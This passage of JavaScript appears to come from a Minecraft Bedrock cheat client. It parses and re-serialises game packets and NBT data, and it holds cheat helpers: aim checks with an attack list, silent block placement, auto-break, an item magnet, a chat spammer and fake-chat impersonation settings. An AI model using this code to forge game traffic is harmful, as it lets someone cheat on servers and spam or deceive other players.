            return ParseBedrockNBT(u8, i);
        }
    }
    return null;
}

function ParseInventoryContentPacket_ReadVarInt(u8, offset) {
    let value = 0;
    let shift = 0;
    let byte;
    do {
        if (offset >= u8.length) break;
        byte = u8[offset++];
        value += (byte & 0x7F) * Math.pow(2, shift);
        shift += 7;
    } while (byte & 0x80);

    let temp = Math.floor(value / 2);
    if (value % 2 !== 0) {
        temp = -temp - 1;
    }
    return {
        value: temp,
        offset: offset
    };
}

function ParseInventoryContentPacket_ReadUnsignedVarInt(u8, offset) {
    let value = 0;
    let shift = 0;
    let byte;
    do {
        if (offset >= u8.length) break;
        byte = u8[offset++];
        value += (byte & 0x7F) * Math.pow(2, shift);
        shift += 7;
    } while (byte & 0x80);
    return {
        value: value,
        offset: offset
    };
}

function ParseInventoryContentPacket(buffer) {
    let u8 = new Uint8Array(buffer);
    let offset = 0;

    let varIntRes = ParseInventoryContentPacket_ReadUnsignedVarInt(u8, offset);
    let windowId = varIntRes.value;
    offset = varIntRes.offset;

    varIntRes = ParseInventoryContentPacket_ReadUnsignedVarInt(u8, offset);
    let itemCount = varIntRes.value;
    offset = varIntRes.offset;

    let items = [];
    let view = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

    for (let i = 0; i < itemCount; i++) {
        if (offset >= u8.length) break;
        let itemStart = offset;

        let idRes = ParseInventoryContentPacket_ReadVarInt(u8, offset);
        let networkId = idRes.value;
        offset = idRes.offset;

        if (networkId === 0) {
            items.push({
                networkId: 0,
                rawData: Array.from(u8.slice(itemStart, offset))
            });
            continue;
        }

        let count = 0;
        if (offset + 1 < u8.length) {
            count = view.getUint16(offset, true);
            offset += 2;
        }

        let metaRes = ParseInventoryContentPacket_ReadUnsignedVarInt(u8, offset);
        let metadata = metaRes.value;
        offset = metaRes.offset;

        let hasStackId = false;
        let stackId = 0;
        if (offset < u8.length) {
            hasStackId = u8[offset++] !== 0;
            if (hasStackId) {
                let stackIdRes = ParseInventoryContentPacket_ReadVarInt(u8, offset);
                stackId = stackIdRes.value;
                offset = stackIdRes.offset;
            }
        }

        let blockRuntimeIdRes = ParseInventoryContentPacket_ReadVarInt(u8, offset);
        let blockRuntimeId = blockRuntimeIdRes.value;
        offset = blockRuntimeIdRes.offset;

        let extraDataLenRes = ParseInventoryContentPacket_ReadUnsignedVarInt(u8, offset);
        let extraDataLen = extraDataLenRes.value;
        offset = extraDataLenRes.offset;

        let extraData = [];
        let parsedNBT = null;
        if (extraDataLen > 0) {
            let actualLen = Math.min(extraDataLen, Math.max(0, u8.length - offset));
            extraData = Array.from(u8.slice(offset, offset + actualLen));
            parsedNBT = ExtractNBT(extraData);
            offset += extraDataLen;
        }

        items.push({
            networkId: networkId,
            count: count,
            metadata: metadata,
            hasStackId: hasStackId,
            stackId: stackId,
            blockRuntimeId: blockRuntimeId,
            extraDataLength: extraDataLen,
            extraData: parsedNBT
        });
    }

    return {
        windowId: windowId,
        itemCount: itemCount,
        items: items,
        leftoverData: offset < u8.length ? Array.from(u8.slice(offset)) : []
    };
}

function ParsePlayerAuthInputPacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        function writeByte(val) {
            packet.push(Number(val) & 0xFF);
        }

        function writeFloat32(val) {
            let buffer = new ArrayBuffer(4);
            new DataView(buffer).setFloat32(0, Number(val), true);
            let u8 = new Uint8Array(buffer);
            for (let i = 0; i < 4; i++) packet.push(u8[i]);
        }

        function writeUVarInt(val) {
            val = Number(val);
            if (!isFinite(val)) val = 0;
            if (val < 0) val = (val & 0xFFFFFFFF) >>> 0;
            let _tuGuard = 0;
            do {
                let temp = val % 128;
                val = Math.floor(val / 128);
                if (val > 0) temp |= 0x80;
                packet.push(temp & 0xFF);
                _tuGuard++;
            } while (val > 0 && _tuGuard < 10);
        }

        function writeSVarInt(val) {
            val = Number(val);
            let uval = val >= 0 ? val * 2 : (Math.abs(val) * 2) - 1;
            writeUVarInt(uval);
        }

        function writeVec3(vec) {
            writeFloat32(vec.x !== undefined ? vec.x : 0);
            writeFloat32(vec.y !== undefined ? vec.y : 0);
            writeFloat32(vec.z !== undefined ? vec.z : 0);
        }

        function writeVec2(vec) {
            writeFloat32(vec.x !== undefined ? vec.x : 0);
            writeFloat32(vec.y !== undefined ? vec.y : 0);
        }

        let pitch = data.rot !== undefined ? data.rot.pitch : (data.pitch !== undefined ? data.pitch : 0);
        let yaw = data.rot !== undefined ? data.rot.yaw : (data.yaw !== undefined ? data.yaw : 0);
        writeFloat32(pitch);
        writeFloat32(yaw);

        writeVec3(data.pos || {});
        writeVec2(data.moveVec || data.move || {});
        writeFloat32(data.headYaw !== undefined ? data.headYaw : 0);

        let inputDataNum = 0;
        if (Array.isArray(data.inputData)) {
            for (let i = 0; i < data.inputData.length; i++) {
                inputDataNum += Math.pow(2, data.inputData[i]);
            }
        } else if (data.inputData !== undefined) {
            inputDataNum = Number(data.inputData);
        }
        writeUVarInt(inputDataNum);

        writeUVarInt(data.inputMode !== undefined ? data.inputMode : 0);
        writeUVarInt(data.playMode !== undefined ? data.playMode : 0);
        writeUVarInt(data.newInteractionModel !== undefined ? data.newInteractionModel : (data.interactionModel !== undefined ? data.interactionModel : 0));

        if ((data.playMode !== undefined ? data.playMode : 0) === 4) {
            writeVec3(data.gazeDirection || {});
        }

        writeUVarInt(data.clientTick !== undefined ? data.clientTick : (data.tick !== undefined ? data.tick : 0));
        writeVec3(data.delta || {});

        if (data.actions && Array.isArray(data.actions)) {
            writeUVarInt(data.actions.length);
            for (let i = 0; i < data.actions.length; i++) {
                let act = data.actions[i];
                writeSVarInt(act.action !== undefined ? act.action : 0);
                writeSVarInt(act.pos !== undefined ? act.pos.x : 0);
                writeUVarInt(act.pos !== undefined ? act.pos.y : 0);
                writeSVarInt(act.pos !== undefined ? act.pos.z : 0);
                writeSVarInt(act.face !== undefined ? act.face : 0);
            }
        } else {
            writeUVarInt(0);
        }

        writeVec2(data.analogMove || data.mAnalogMoveVector || {});
        writeVec3(data.cameraOrientation || data.mCameraOrientation || {});
        writeVec2(data.rawMoveVec || data.mRawMoveVector || {});
        writeVec2(data.interactRotation || data.mInteractRots || {});
        writeVec2(data.vehicleRotation || data.mCameraRot || {});

        writeByte(data.isCameraDeparted ? 1 : 0);
        writeByte(data.isThirdPersonPerspective ? 1 : 0);
        writeByte(data.isReadyPosDeltaDirty !== undefined ? (data.isReadyPosDeltaDirty ? 1 : 0) : (data.mReadyPosDeltaDirty ? 1 : 0));
        writeByte(data.isOnGround ? 1 : 0);
        writeByte(data.resetPosition !== undefined ? data.resetPosition : (data.mResetPosition ? 1 : 0));

        let vehicle = data.clientPredictedVehicle !== undefined ? data.clientPredictedVehicle : "-1";
        writeSVarInt(Number(vehicle));

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;
        let dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

        function readByte() {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        }

        function readFloat32() {
            if (offset + 4 > u8.length) return 0;
            let val = dv.getFloat32(offset, true);
            offset += 4;
            return val;
        }

        function readUVarInt() {
            let value = 0;
            let multiplier = 1;
            let byteData;
            do {
                if (offset >= u8.length) break;
                byteData = u8[offset++];
                value += (byteData & 0x7F) * multiplier;
                multiplier *= 128;
            } while (byteData & 0x80);
            return value;
        }

        function readSVarInt() {
            let value = readUVarInt();
            let temp = Math.floor(value / 2);
            if (value % 2 !== 0) {
                temp = -temp - 1;
            }
            return temp;
        }

        function readVec3() {
            return {
                x: readFloat32(),
                y: readFloat32(),
                z: readFloat32()
            };
        }

        function readVec2() {
            return {
                x: readFloat32(),
                y: readFloat32()
            };
        }

        let result = {};

        result.rot = {
            pitch: readFloat32(),
            yaw: readFloat32()
        };
        result.pos = readVec3();
        result.moveVec = readVec2();

        let headYaw = readFloat32();

        let rawInputData = readUVarInt();
        result.inputData = [];
        let bitIndex = 0;
        let tempVal = rawInputData;
        while (tempVal > 0) {
            if (tempVal % 2 !== 0) {
                result.inputData.push(bitIndex);
            }
            tempVal = Math.floor(tempVal / 2);
            bitIndex++;
        }

        result.inputMode = readUVarInt();
        result.playMode = readUVarInt();
        result.newInteractionModel = readUVarInt();

        if (result.playMode === 4) {
            result.gazeDirection = readVec3();
        }

        result.clientTick = readUVarInt();
        result.delta = readVec3();

        let actionCount = readUVarInt();
        result.actions = [];
        for (let i = 0; i < actionCount; i++) {
            result.actions.push({
                action: readSVarInt(),
                pos: {
                    x: readSVarInt(),
                    y: readUVarInt(),
                    z: readSVarInt()
                },
                face: readSVarInt()
            });
        }

        result.analogMove = readVec2();
        result.cameraOrientation = readVec3();
        result.rawMoveVec = readVec2();
        result.interactRotation = readVec2();
        result.vehicleRotation = readVec2();

        result.isCameraDeparted = readByte() === 1;
        result.isThirdPersonPerspective = readByte() === 1;
        result.isReadyPosDeltaDirty = readByte() === 1;
        result.isOnGround = readByte() === 1;
        result.resetPosition = readByte();

        if (offset < u8.length) {
            result.clientPredictedVehicle = readSVarInt().toString();
        } else {
            result.clientPredictedVehicle = "-1";
        }

        return result;
    }
}

function ParseLevelChunkPacket(data) {
    let u8 = new Uint8Array(data);
    let offset = 0;
    let dv = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

    function readByte() {
        if (offset >= u8.length) return 0;
        return u8[offset++];
    }

    function readUVarInt() {
        let value = 0;
        let shift = 0;
        let byte;
        do {
            if (offset >= u8.length) break;
            byte = u8[offset++];
            value += (byte & 0x7F) * Math.pow(2, shift);
            shift += 7;
        } while (byte & 0x80);
        return value;
    }

    function readSVarInt() {
        let value = readUVarInt();
        let temp = Math.floor(value / 2);
        if (value % 2 !== 0) {
            temp = -temp - 1;
        }
        return temp;
    }

    let x = readSVarInt();
    let z = readSVarInt();
    let dimension = readSVarInt();
    let sub_chunk_count = readUVarInt();

    let highest_sub_chunk_count = 0;
    if (offset + 2 <= u8.length) {
        highest_sub_chunk_count = dv.getUint16(offset, true);
        offset += 2;
    }

    let cache_enabled = readByte() !== 0;

    let blobs = [];
    if (cache_enabled) {
        let hashCount = readUVarInt();
        for (let i = 0; i < hashCount; i++) {
            if (offset + 8 > u8.length) break;
            let low = dv.getUint32(offset, true);
            let high = dv.getUint32(offset + 4, true);
            let hashStr = high.toString(16).padStart(8, '0') + low.toString(16).padStart(8, '0');
            blobs.push(hashStr);
            offset += 8;
        }
    }

    let payloadLength = readUVarInt();
    let payloadOffset = offset;
    let payload = Array.from(u8.slice(payloadOffset, payloadOffset + payloadLength));

    function readNbtString(nbtOffset) {
        if (nbtOffset + 2 > u8.length) return {
            str: "",
            len: 2
        };
        let len = dv.getUint16(nbtOffset, true);
        let curr = nbtOffset + 2;
        let str = "";
        let end = Math.min(curr + len, u8.length);
        while (curr < end) {
            let c = u8[curr++];
            if (c < 0x80) {
                str += String.fromCharCode(c);
            } else if (c >= 0xC0 && c < 0xE0) {
                if (curr >= end) break;
                let c2 = u8[curr++];
                str += String.fromCharCode(((c & 0x1F) << 6) | (c2 & 0x3F));
            } else if (c >= 0xE0 && c < 0xF0) {
                if (curr + 1 >= end) break;
                let c2 = u8[curr++];
                let c3 = u8[curr++];
                str += String.fromCharCode(((c & 0x0F) << 12) | ((c2 & 0x3F) << 6) | (c3 & 0x3F));
            } else if (c >= 0xF0 && c < 0xF8) {
                if (curr + 2 >= end) break;
                let c2 = u8[curr++];
                let c3 = u8[curr++];
                let c4 = u8[curr++];
                let u = (((c & 0x07) << 18) | ((c2 & 0x3F) << 12) | ((c3 & 0x3F) << 6) | (c4 & 0x3F)) - 0x10000;
                str += String.fromCharCode(0xD800 | (u >> 10), 0xDC00 | (u & 0x3FF));
            }
        }
        return {
            str: str,
            len: curr - nbtOffset
        };
    }

    function readTag(type, currentOffset) {
        switch (type) {
            case 1:
                let b = u8[currentOffset];
                return {
                    val: b > 127 ? b - 256 : b, len: 1
                };
            case 2:
                return {
                    val: dv.getInt16(currentOffset, true), len: 2
                };
            case 3:
                return {
                    val: dv.getInt32(currentOffset, true), len: 4
                };
            case 4:
                return {
                    val: Number(dv.getBigInt64(currentOffset, true)), len: 8
                };
            case 5:
                return {
                    val: dv.getFloat32(currentOffset, true), len: 4
                };
            case 6:
                return {
                    val: dv.getFloat64(currentOffset, true), len: 8
                };
            case 7:
                let blen = dv.getInt32(currentOffset, true);
                return {
                    val: Array.from(u8.slice(currentOffset + 4, currentOffset + 4 + blen)), len: 4 + blen
                };
            case 8:
                let sRes = readNbtString(currentOffset);
                return {
                    val: sRes.str, len: sRes.len
                };
            case 9:
                let listType = u8[currentOffset];
                let llen = dv.getInt32(currentOffset + 1, true);
                let listOff = currentOffset + 5;
                let list = [];
                for (let j = 0; j < llen; j++) {
                    let r = readTag(listType, listOff);
                    list.push(r.val);
                    listOff += r.len;
                }
                return {
                    val: list, len: listOff - currentOffset
                };
            case 10:
                let obj = {};
                let objOff = currentOffset;
                while (objOff < u8.length) {
                    let t = u8[objOff++];
                    if (t === 0) break;
                    let nameRes = readNbtString(objOff);
                    objOff += nameRes.len;
                    let valRes = readTag(t, objOff);
                    obj[nameRes.str] = valRes.val;
                    objOff += valRes.len;
                }
                return {
                    val: obj, len: objOff - currentOffset
                };
            case 11:
                let ilen = dv.getInt32(currentOffset, true);
                let iArr = [];
                let iOff = currentOffset + 4;
                for (let j = 0; j < ilen; j++) {
                    iArr.push(dv.getInt32(iOff, true));
                    iOff += 4;
                }
                return {
                    val: iArr, len: iOff - currentOffset
                };
            default:
                return {
                    val: null, len: 0
                };
        }
    }

    function extractBlockEntities(startIndex) {
        let scanOffset = startIndex;
        let entities = [];
        while (scanOffset < u8.length) {
            try {
                let rootType = u8[scanOffset++];
                if (rootType === 10) {
                    let nameRes = readNbtString(scanOffset);
                    scanOffset += nameRes.len;
                    let entityRes = readTag(10, scanOffset);
                    scanOffset += entityRes.len;
                    if (entityRes.val && (entityRes.val.id || entityRes.val.x !== undefined)) {
                        entities.push(entityRes.val);
                    }
                } else if (rootType === 0) {
                    continue;
                } else {
                    break;
                }
            } catch (e) {
                break;
            }
        }
        return entities;
    }

    let block_entities = [];

    for (let i = payloadOffset; i < u8.length - 2; i++) {
        if (u8[i] === 10 && u8[i + 1] === 0 && u8[i + 2] === 0) {
            let possibleEntities = extractBlockEntities(i);
            if (possibleEntities.length > 0) {
                block_entities = possibleEntities;
                break;
            }
        }
    }

    return {
        x: x,
        z: z,
        dimension: dimension,
        sub_chunk_count: sub_chunk_count,
        highest_sub_chunk_count: highest_sub_chunk_count,
        cache_enabled: cache_enabled,
        blobs: blobs,
        payload: payload,
        block_entities: block_entities
    };
}

function ParseDataPacketNBT(data, toBytes) {
    const readShort = (bytes, off) => (bytes[off] | (bytes[off + 1] << 8)) << 16 >> 16;
    const readInt = (bytes, off) => (bytes[off] | (bytes[off + 1] << 8) | (bytes[off + 2] << 16) | (bytes[off + 3] << 24)) << 0;
    const readBigInt64 = (bytes, off) => new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength).getBigInt64(off, true);
    const readFloat = (bytes, off) => new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength).getFloat32(off, true);
    const readDouble = (bytes, off) => new DataView(bytes.buffer, bytes.byteOffset, bytes.byteLength).getFloat64(off, true);

    const writeShort = (arr, val) => {
        arr.push(val & 0xFF, (val >> 8) & 0xFF);
    };
    const writeInt = (arr, val) => {
        arr.push(val & 0xFF, (val >> 8) & 0xFF, (val >> 16) & 0xFF, (val >> 24) & 0xFF);
    };
    const writeBigInt64 = (arr, val) => {
        const buf = new ArrayBuffer(8);
        new DataView(buf).setBigInt64(0, val, true);
        arr.push(...new Uint8Array(buf));
    };
    const writeFloat = (arr, val) => {
        const buf = new ArrayBuffer(4);
        new DataView(buf).setFloat32(0, val, true);
        arr.push(...new Uint8Array(buf));
    };
    const writeDouble = (arr, val) => {
        const buf = new ArrayBuffer(8);
        new DataView(buf).setFloat64(0, val, true);
        arr.push(...new Uint8Array(buf));
    };

    const decodeUtf8 = (bytes) => {
        let str = '';
        let i = 0;
        while (i < bytes.length) {
            const b = bytes[i++];
            if (b < 0x80) {
                str += String.fromCharCode(b);
            } else if (b < 0xE0) {
                const b2 = bytes[i++];
                str += String.fromCharCode(((b & 0x1F) << 6) | (b2 & 0x3F));
            } else if (b < 0xF0) {
                const b2 = bytes[i++];
                const b3 = bytes[i++];
                str += String.fromCharCode(((b & 0x0F) << 12) | ((b2 & 0x3F) << 6) | (b3 & 0x3F));
            } else {
                const b2 = bytes[i++];
                const b3 = bytes[i++];
                const b4 = bytes[i++];
                const cp = ((b & 0x07) << 18) | ((b2 & 0x3F) << 12) | ((b3 & 0x3F) << 6) | (b4 & 0x3F);
                if (cp >= 0x10000) {
                    str += String.fromCharCode(0xD800 + ((cp - 0x10000) >> 10));
                    str += String.fromCharCode(0xDC00 + ((cp - 0x10000) & 0x3FF));
                } else {
                    str += String.fromCharCode(cp);
                }
            }
        }
        return str;
    };

    const encodeUtf8 = (str) => {
        const bytes = [];
        for (let i = 0; i < str.length; i++) {
            let cp = str.charCodeAt(i);
            if (cp >= 0xD800 && cp <= 0xDBFF && i + 1 < str.length) {
                const low = str.charCodeAt(i + 1);
                if (low >= 0xDC00 && low <= 0xDFFF) {
                    cp = ((cp - 0xD800) << 10) + (low - 0xDC00) + 0x10000;
                    i++;
                }
            }
            if (cp < 0x80) {
                bytes.push(cp);
            } else if (cp < 0x800) {
                bytes.push(0xC0 | (cp >> 6), 0x80 | (cp & 0x3F));
            } else if (cp < 0x10000) {
                bytes.push(0xE0 | (cp >> 12), 0x80 | ((cp >> 6) & 0x3F), 0x80 | (cp & 0x3F));
            } else {
                bytes.push(0xF0 | (cp >> 18), 0x80 | ((cp >> 12) & 0x3F), 0x80 | ((cp >> 6) & 0x3F), 0x80 | (cp & 0x3F));
            }
        }
        return bytes;
    };

    const parsePayload = (type, bytes, offset) => {
        switch (type) {
            case 1:
                return {
                    value: bytes[offset++], offset
                };
            case 2:
                return {
                    value: readShort(bytes, offset), offset: offset + 2
                };
            case 3:
                return {
                    value: readInt(bytes, offset), offset: offset + 4
                };
            case 4:
                return {
                    value: readBigInt64(bytes, offset), offset: offset + 8
                };
            case 5:
                return {
                    value: readFloat(bytes, offset), offset: offset + 4
                };
            case 6:
                return {
                    value: readDouble(bytes, offset), offset: offset + 8
                };
            case 8: {
                const len = readShort(bytes, offset);
                offset += 2;
                const str = decodeUtf8(bytes.slice(offset, offset + len));
                offset += len;
                return {
                    value: str,
                    offset
                };
            }
            case 9: {
                const childType = bytes[offset++];
                const length = readInt(bytes, offset);
                offset += 4;
                const arr = [];
                for (let i = 0; i < length; i++) {
                    const res = parsePayload(childType, bytes, offset);
                    arr.push(res.value);
                    offset = res.offset;
                }
                return {
                    value: arr,
                    offset
                };
            }
            case 10: {
                const obj = {};
                while (true) {
                    const tag = bytes[offset++];
                    if (tag === 0) break;
                    const nameLen = readShort(bytes, offset);
                    offset += 2;
                    const name = decodeUtf8(bytes.slice(offset, offset + nameLen));
                    offset += nameLen;
                    const res = parsePayload(tag, bytes, offset);
                    obj[name] = res.value;
                    offset = res.offset;
                }
                return {
                    value: obj,
                    offset
                };
            }
            case 11: {
                const len = readInt(bytes, offset);
                offset += 4;
                const arr = new Int32Array(len);
                for (let i = 0; i < len; i++) {
                    arr[i] = readInt(bytes, offset);
                    offset += 4;
                }
                return {
                    value: Array.from(arr),
                    offset
                };
            }
            case 12: {
                const len = readInt(bytes, offset);
                offset += 4;
                const arr = new BigInt64Array(len);
                for (let i = 0; i < len; i++) {
                    arr[i] = readBigInt64(bytes, offset);
                    offset += 8;
                }
                return {
                    value: Array.from(arr),
                    offset
                };
            }
            default:
                throw new Error('Unsupported NBT type: ' + type);
        }
    };

    const parseNbt = (bytes, offset) => {
        const tagType = bytes[offset++];
        if (tagType === 0) return {
            value: null,
            offset
        };
        const nameLength = readShort(bytes, offset);
        offset += 2;
        let name = '';
        if (nameLength > 0) {
            name = decodeUtf8(bytes.slice(offset, offset + nameLength));
            offset += nameLength;
        }
        const res = parsePayload(tagType, bytes, offset);
        return {
            name,
            value: res.value,
            offset: res.offset
        };
    };

    const getTagType = (value) => {
        if (typeof value === 'string') return 8;
        if (typeof value === 'number') return Number.isInteger(value) ? 3 : 6;
        if (typeof value === 'bigint') return 4;
        if (Array.isArray(value)) return 9;
        if (typeof value === 'object' && value !== null) return 10;
        return 1;
    };

    const writePayload = (parts, type, value) => {
        switch (type) {
            case 1:
                parts.push(value & 0xFF);
                break;
            case 2:
                writeShort(parts, value);
                break;
            case 3:
                writeInt(parts, value);
                break;
            case 4:
                writeBigInt64(parts, BigInt(value));
                break;
            case 5:
                writeFloat(parts, value);
                break;
            case 6:
                writeDouble(parts, value);
                break;
            case 8: {
                const strBytes = encodeUtf8(value);
                writeShort(parts, strBytes.length);
                parts.push(...strBytes);
                break;
            }
            case 9: {
                const childType = value.length > 0 ? getTagType(value[0]) : 1;
                parts.push(childType);
                writeInt(parts, value.length);
                for (const item of value) writePayload(parts, childType, item);
                break;
            }
            case 10: {
                for (const key of Object.keys(value)) {
                    const v = value[key];
                    const t = getTagType(v);
                    parts.push(t);
                    const nameBytes = encodeUtf8(key);
                    writeShort(parts, nameBytes.length);
                    parts.push(...nameBytes);
                    writePayload(parts, t, v);
                }
                parts.push(0);
                break;
            }
            case 11: {
                writeInt(parts, value.length);
                for (const num of value) writeInt(parts, num);
                break;
            }
            case 12: {
                writeInt(parts, value.length);
                for (const num of value) writeBigInt64(parts, BigInt(num));
                break;
            }
            default:
                throw new Error('Unsupported type');
        }
    };

    const serializeNbt = (obj) => {
        const parts = [];
        parts.push(10);
        writeShort(parts, 0);
        writePayload(parts, 10, obj);
        return new Uint8Array(parts);
    };

    if (toBytes) {
        if (typeof data === 'object' && data !== null && Object.keys(data).length === 0) {
            return [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
        }
        try {
            const nbtBytes = serializeNbt(data);
            const prefix = [255, 255, 1];
            return [...prefix, ...Array.from(nbtBytes)];
        } catch (e) {
            return [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
        }
    } else {
        try {
            const bytes = data instanceof Uint8Array ? data : new Uint8Array(data);
            const nbtData = bytes.slice(3);
            const result = parseNbt(nbtData, 0);
            return result.value ?? {};
        } catch (e) {
            return {};
        }
    }
}

const simulatePlace = (x, y, z) => {
    const block_c = getBlock(x, y, z);
    if (block_c.id !== 0) return;
    const pos_list = [
        [x, y + 1, z],
        [x, y - 1, z],
        [x, y, z + 1],
        [x, y, z - 1],
        [x + 1, y, z],
        [x - 1, y, z]
    ];
    pos_list.some((pos, i) => {
        const block = getBlock(pos[0], pos[1], pos[2]);
        if (block.namespace !== "minecraft:air") return buildBlock(self_id, pos[0], pos[1], pos[2], i);
    });
}

function SilentBuild(x, y, z, slot) {
    const block = getBlock(x, y, z);
    if (block.id !== 0) return;
    const SilentBuild_Offsets = [
        [0, 1, 0, 0, 1, 0, 0],
        [0, -1, 0, 0, -1, 0, 1],
        [0, 0, 1, 0, 0, 0, 2],
        [0, 0, -1, 0, 0, 0, 3],
        [1, 0, 0, 0, 0, 0, 4],
        [-1, 0, 0, 0, 0, 0, 5],
        [1, 0, 1, 0, 0, 0, 4],
        [1, 0, -1, 0, 0, 0, 4],
        [-1, 0, 1, 0, 0, 0, 3],
        [-1, 0, -1, 0, 0, 0, 3]
    ];
    let SilentBuild_Result;
    for (let i = 0; i < SilentBuild_Offsets.length; i++) {
        let b = getBlock(x + SilentBuild_Offsets[i][0], y + SilentBuild_Offsets[i][1], z + SilentBuild_Offsets[i][2]);
        if (b.id !== 0) {
            SilentBuild_Result = SilentBuildBlock(x + SilentBuild_Offsets[i][3], y + SilentBuild_Offsets[i][4], z + SilentBuild_Offsets[i][5], slot, SilentBuild_Offsets[i][6]);
            return SilentBuild_Result;
        }
    }
}

const isAimed = (id, target, fov, mode) => {
    let yaw = Math.abs(getPlayerAngle(id, target, "yaw_rot"))
    let pitch = Math.abs(getPlayerAngle(id, target, "pitch_rot"))
    if (mode === 0) return Math.sqrt(yaw * yaw + pitch * pitch) < fov
    if (mode === 1) return (Math.abs(yaw) < fov)
    if (mode === 2) return (Math.abs(pitch) < fov)
} // 是否瞄准

const getRandomFloat = (min, max) => {
    return Math.random() * (max - min) + min;
}
const defaultData = [{
    x: 2,
    y: 3,
    z: 2
}, {
    x: 2,
    y: 5,
    z: 2
}, {
    x: 2,
    y: 6,
    z: 2
}, {
    x: 2,
    y: 7,
    z: 2
}, {
    x: 3,
    y: 2,
    z: 2
}, {
    x: 3,
    y: 3,
    z: 2
}, {
    x: 3,
    y: 5,
    z: 2
}, {
    x: 3,
    y: 7,
    z: 2
}, {
    x: 4,
    y: 1,
    z: 2
}, {
    x: 4,
    y: 2,
    z: 2
}, {
    x: 4,
    y: 5,
    z: 2
}, {
    x: 4,
    y: 6,
    z: 2
}, {
    x: 4,
    y: 7,
    z: 2
}, {
    x: 4,
    y: 8,
    z: 2
}, {
    x: 4,
    y: 9,
    z: 2
}, {
    x: 5,
    y: 0,
    z: 2
}, {
    x: 5,
    y: 1,
    z: 2
}, {
    x: 5,
    y: 2,
    z: 2
}, {
    x: 5,
    y: 3,
    z: 2
}, {
    x: 5,
    y: 4,
    z: 2
}, {
    x: 6,
    y: 1,
    z: 2
}, {
    x: 6,
    y: 2,
    z: 2
}, {
    x: 6,
    y: 5,
    z: 2
}, {
    x: 6,
    y: 7,
    z: 2
}, {
    x: 6,
    y: 8,
    z: 2
}, {
    x: 6,
    y: 9,
    z: 2
}, {
    x: 7,
    y: 2,
    z: 2
}, {
    x: 7,
    y: 3,
    z: 2
}, {
    x: 7,
    y: 5,
    z: 2
}, {
    x: 7,
    y: 7,
    z: 2
}, {
    x: 7,
    y: 9,
    z: 2
}, {
    x: 8,
    y: 3,
    z: 2
}, {
    x: 8,
    y: 5,
    z: 2
}, {
    x: 8,
    y: 6,
    z: 2
}, {
    x: 8,
    y: 7,
    z: 2
}, {
    x: 8,
    y: 9,
    z: 2
}];

let currentBlockIndex = 0;
let frameCounter = 0;
let selectedPlayers = [];
let attackList = [];
let AutoBreak_Range = 3;
let AutoBreak_Interval = 0;
let AutoBreak_Tick = 0;
let Hand_Speed = 0;
let Registeruser;
let Registerpass;
let loginUser;
let loginpass;
let respawnHealthData;
let currentHealth;
let respawnPosition;
let itemMagnetDelay = -1;
let SpammerTiming = 0;
let Spammer_Delay = 0;
let ChatLock_Time = 0;
let FakeChat_Name = "TimeUnity"
let FakeChat_Text = "你充Q币吗"
let ChatLock_add = []
let AutoRC_IP_Time = 20000;
let RpcData = "";
const ChatRecord = _app.getResource() + '/TimeUnity/聊天记录.txt';
const Get_Type = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36 Edg/99.0.1150.55',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.85,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.85',
    'Authorization': 'Bearer token'
};

function getPlayerNameList() {
    let output = ["不添加玩家"]
    let WorldList = getWorldPlayerList();
    for (i in WorldList) {
        output.push(WorldList[i].name);
    }
    return output;
}

function getPlayerNameChatList() {
    let output = ["不删除玩家", ...ChatLock_add]
    return output
}

const nbts = {};
const en_nbts = {};

let Shielding_Container = false;
const splitText = (string, strA, strB, extra) => {
    let start = string.indexOf(strA) + strA.length
    let finish = string.indexOf(strB, start)
    if (typeof extra !== 'undefined' && string.indexOf(extra, start) < finish && string.indexOf(extra, start) != -1) finish = string.indexOf(extra, start)
    if (start === -1 || finish === -1) return null
    return string.substring(start, finish)
}

const nbt2object = (nbt) => {
    if (nbts[nbt] !== undefined) return nbts[nbt];
    let namespace = splitText(nbt, ',Name:"', '",WasPickedUp');
    if (namespace === null || namespace === '' || typeof namespace !== 'string') {
        namespace = splitText(nbt, 'Name:"', '"');
    }
    if (namespace === '' || typeof namespace !== 'string') return {
        aux: 0,
        count: 0,
        namespace: "minecraft:air",
        enchants: []
    };
    const aux = Number(splitText(nbt, ',aux:', ','));
    const count = Number(splitText(nbt, 'Count:', 'b,D'));
    const name = nbt.includes(',name:"') ? splitText(nbt, ',name:"', '",') : namespace.replace("minecraft:", "");
    const id = nbt.includes(',netId:') ? Number(splitText(nbt, ',netId:', '}')) : 0;
    const itemId = nbt.includes('id') ? Number(splitText(nbt, ',id:', ',')) : 0;
    const damage = nbt.includes('maxDamage') ? Number(splitText(nbt, ',maxDamage:', ',')) : 0;
    const blockRuntimeId = nbt.includes('blockRuntimeId') ? Number(splitText(nbt, ',blockRuntimeId:', ',')) : 0;
    const attackDamage = nbt.includes('attackDamage') ? Number(splitText(nbt, 'attackDamage:', ',')) : 1;
    const color = nbt.includes('customColor') ? splitText(nbt, 'customColor:', '}', ',') : "";
    const enchant = nbt.includes('ench:[{') ? ("[{" + splitText(nbt, 'ench:[{', '}]')).replace(/s/g, '').replace(/id/g, '"id"').replace(/lvl/g, '"lvl"').replace(/modEnchant/g, '"modEnchant"') + "}]" : "[]";
    const isBlock = nbt.startsWith('{Block:');
    const obj = {
        name,
        namespace,
        aux,
        blockRuntimeId,
        damage,
        attackDamage,
        count,
        color,
        isBlock,
        id,
        itemId,
        enchants: JSON.parse(enchant)
    };
    nbts[nbt] = obj;
    return obj;
}

const getNbtVal = (str, key, type) => {
    const regex = new RegExp(`${key}:\\s*(?:"([^"]*)"|([^}\\]]+))`);
    const match = str.match(regex);

    if (!match) return null;

    if (type === 'str') {
